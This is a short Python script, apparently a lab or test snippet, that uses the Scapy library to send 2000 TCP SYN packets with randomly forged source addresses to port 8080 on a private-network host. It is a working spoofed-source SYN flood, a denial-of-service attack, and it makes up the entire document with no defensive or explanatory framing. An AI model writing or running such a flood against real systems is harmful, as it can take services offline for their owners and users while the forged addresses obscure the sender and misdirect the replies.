from scapy.all import *
import random

target = "192.168.100.20"

for i in range(2000):
    fake_ip = f"10.0.0.{random.randint(1,254)}"
    pkt = IP(src=fake_ip, dst=target)/TCP(dport=8080, flags="S")
    send(pkt, verbose=0)
